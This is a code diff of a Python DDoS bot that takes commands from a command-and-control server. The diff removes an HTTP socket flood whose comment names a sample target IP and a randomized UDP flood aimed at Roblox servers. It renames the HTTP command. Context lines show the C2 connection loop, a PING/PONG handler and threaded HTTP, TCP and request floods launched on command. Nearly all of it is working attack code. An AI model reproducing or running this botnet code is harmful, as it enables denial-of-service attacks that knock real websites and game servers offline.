@@ -21,90 +21,6 @@ def rand_ua(mode):
         ua = user_gen2()
     return ua
 
-def generate_url_path():
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, 5))
-    return data
-
-def http_pyf(ip, port,header): # .PYFLOODER http://51.159.30.249 80 1
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        dos.connect((ip, port))
-
-        byt = (f"{header}").encode()
-        dos.send(byt)
-        for tread in range(500):
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            for tread in range(500):
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-        dos.send(byt)
-        for tread in range(500):
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            for tread in range(500):
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-                dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-            dos.send(byt)
-        dos.send(byt)
-    except socket.error:
-        pass
-    finally:
-        dos.shutdown(socket.SHUT_RDWR)
-        dos.close()
-
 def CFB(url,method,secs):
     
     while time.time() < secs:
@@ -223,30 +139,6 @@ def REQ_attack(ip,method,secs):
                 requests.head(ip,headers=headers)
                 requests.options(ip,headers=headers)
 
-def attack_roblox(ip, port, secs, size,mode):
-    
-    while time.time() < secs:
-         
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        if mode == "RE_SLOW":
-            bytes = random._urandom(size)
-        dport = random.randint(1, 65535) if port == 0 else port
-        for _ in range(1500):
-
-            if mode == "RE_NOW":
-                bytes = random._urandom(size)
-
-            ran = random.randrange(10**80)
-            hex = "%064x" % ran
-            hex = hex[:64] 
-
-            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
-            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
-            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
-            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
-            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
-            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
-
 def main():
     c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
@@ -275,9 +167,9 @@ def main():
             command = args[0].upper()
             if command == 'PING':
                 c2.send('PONG'.encode())
-            elif command == ".HTTP_PYF":
+            elif command == ".HTTP_REQ":
                 url = args[1]
-                method = str(args[2])
+                method = args[2]
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
                 for _ in range(threads):
@@ -293,17 +185,6 @@ def main():
                     threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                     threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                     threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
-            elif command == '.ROBLOX':
-                 
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                size = int(args[4])
-                mode = args[5]
-                threads = int(args[6])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_roblox, args=(ip, port, secs, size,mode), daemon=True).start()
             elif command == '.TCP':
                  
                 ip = args[1]
